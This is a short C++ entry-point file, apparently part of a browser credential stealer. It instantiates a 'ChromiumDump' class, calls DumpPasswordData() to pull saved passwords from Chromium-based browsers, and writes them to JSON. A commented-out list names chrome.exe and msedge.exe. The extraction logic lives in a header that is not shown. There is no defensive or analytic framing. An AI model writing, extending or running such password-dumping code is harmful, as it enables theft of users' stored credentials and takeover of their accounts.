#pragma once
#include "ChromiumDump.h"


int main() {
	//std::vector<wstring> denylist{ L"chrome.exe", L"msedge.exe" };
	ChromiumDump chrome = ChromiumDump::ChromiumDump();
	chrome.DumpPasswordData();
	chrome.WriteJSON();
	return 0;
}